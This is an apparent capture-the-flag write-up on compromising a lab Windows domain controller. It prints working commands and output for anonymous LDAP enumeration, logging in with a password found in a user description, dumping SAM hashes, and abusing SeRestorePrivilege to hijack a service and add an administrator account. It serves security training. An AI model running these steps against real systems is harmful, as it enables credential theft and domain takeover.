
## Lab Details
- Difficulty: Easy
- OS: Windows

## Summary
- Initial access: AD Enumeration, AD User Modify
- Privilege escalation: SeRestorePrivilege

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.234.71 -sC -sV -A -p- -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-03 02:54 EDT
Stats: 0:03:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 70.00% done; ETC: 02:58 (0:00:17 remaining)
Nmap scan report for 10.129.234.71
Host is up (0.0029s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-03 06:57:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-07-02T06:53:11
|_Not valid after:  2027-01-01T06:53:11
|_ssl-date: 2026-07-03T06:58:59+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-03T06:58:19+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
51649/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51650/tcp open  msrpc         Microsoft Windows RPC
61971/tcp open  msrpc         Microsoft Windows RPC
62768/tcp open  msrpc         Microsoft Windows RPC
62780/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-03T06:58:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 268.81 seconds
```
## Foothold

#### Steps
- Add below to `/etc/hosts`
```
10.129.234.71 baby.vl BabyDC.baby.vl
```
- From the nmap output the target can be derived as a Domain Controller
- Enumerate users 
```
$ nxc ldap BabyDC.baby.vl -u '' -p '' --users
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\: 
LDAP        10.129.234.71   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.234.71   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.234.71   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.234.71   389    BABYDC           Jacqueline.Barnett            2021-11-21 10:11:03 0                                                                    
LDAP        10.129.234.71   389    BABYDC           Ashley.Webb                   2021-11-21 10:11:03 0                                                                    
LDAP        10.129.234.71   389    BABYDC           Hugh.George                   2021-11-21 10:11:03 0                                                                    
LDAP        10.129.234.71   389    BABYDC           Leonard.Dyer                  2021-11-21 10:11:03 0                                                                    
LDAP        10.129.234.71   389    BABYDC           Connor.Wilkinson              2021-11-21 10:11:08 0                                                                    
LDAP        10.129.234.71   389    BABYDC           Joseph.Hughes                 2021-11-21 10:11:08 0                                                                    
LDAP        10.129.234.71   389    BABYDC           Kerry.Wilson                  2021-11-21 10:11:08 0                                                                    
LDAP        10.129.234.71   389    BABYDC           Teresa.Bell                   2021-11-21 10:14:37 0        Set initial password to BabyStart123!  
```
- Identified a password for user `Teresa.Bell`
- Perform password spray however unable to identified a valid credential pair
- Enumerated target further using `ldapsearch`, identified a user named `Caroline Robinson`
```
ldapsearch -H ldap://10.129.234.71 -x -b "dc=baby,dc=vl" -w "(&(objectCategory=person)(objectClass=user))"
<SNIP>
# Caroline Robinson, it, baby.vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
<SNIP>
```
- Use the password found to login as `Caroline Robinson`, prompts error password must change
```
$nxc rdp 10.129.234.71 -u 'Caroline.Robinson' -p 'BabyStart123!'
RDP         10.129.234.71   3389   BABYDC           [*] Windows 10 or Windows Server 2016 Build 20348 (name:BABYDC) (domain:baby.vl) (nla:True)
RDP         10.129.234.71   3389   BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! (STATUS_PASSWORD_MUST_CHANGE)
```
- Perform password change
```
smbpasswd -U BABY/caroline.robinson -r baby.vl
Old SMB password:
New SMB password:
Retype new SMB password:
machine baby.vl rejected to change the password with error: When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria.
```
- Able to authenticated as `caroline.robinson` with the new password
```
$nxc winrm 10.129.234.71 -u 'Caroline.Robinson' -p 'Password123!'
WINRM       10.129.234.71   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.129.234.71   5985   BABYDC           [+] baby.vl\Caroline.Robinson:Password123! (Pwn3d!)
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Enumerate user permission and found the user has `SeBackup` and `SeRestore`
```
$evil-winrm -i 10.129.234.71 -u 'Caroline.Robinson' -p 'Password123!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /all
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
- Attempt to dump hashes using SAM and System registry hives
```
$ reg save hklm\sam c:\temp\sam

$ reg save hklm\system c:\temp\system
```

```
$impacket-secretsdump LOCAL -sam sam -system system
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```
- Unable to login as administrator 
```
$nxc smb 10.129.234.71 -u Administrator -H 8d992faed38128ae85e95fa35868bb43
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE
```
- Attempt to create a user and add to administrator group using the `SeRetorePrivilege`
- Using https://github.com/0x4D-5A/Invoke-SeRestoreAbuse/blob/main/Invoke-SeRestoreAbuse.ps1
```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload Invoke-SeRestoreAbuse.ps1

Info: Uploading /home/ch4os1/HTB-Boxes/Baby/Invoke-SeRestoreAbuse.ps1 to C:\Users\Caroline.Robinson\Documents\Invoke-SeRestoreAbuse.ps1

Data: 8712 bytes of 8712 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> . ./Invoke-SeRestoreAbuse.ps1
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> Invoke-SeRestoreAbuse -Command 'cmd /c net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add'
[+] SeRestorePrivilege privilege enabled
[+] ImagePath set to: cmd /c net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add
[+] Seclogon service started
[+] ImagePath restored to: %windir%\system32\svchost.exe -k netsvcs -p
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> Get-LocalUser

Name               Enabled Description
----               ------- -----------
Administrator      True    Built-in account for administering the computer/domain
Guest              False   Built-in account for guest access to the computer/domain
krbtgt             False   Key Distribution Center Service Account
Jacqueline.Barnett True
Ashley.Webb        True
Hugh.George        True
Leonard.Dyer       True
Ian.Walker         True
Connor.Wilkinson   True
Joseph.Hughes      True
Kerry.Wilson       True
Teresa.Bell        True    Set initial password to BabyStart123!
Caroline.Robinson  True
hacker             True
```
- Able to authenticate with the new user and the user has admin access
```
$nxc smb 10.129.234.71 -u hacker -p 'P@ssw0rd123!'

SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.71   445    BABYDC           [+] baby.vl\hacker:P@ssw0rd123! (Pwn3d!)
```
- Use `evil-winrm` to login as the newly created user
```
$evil-winrm -i 10.129.234.71 -u 'hacker' -p 'P@ssw0rd123!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents>
```


## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: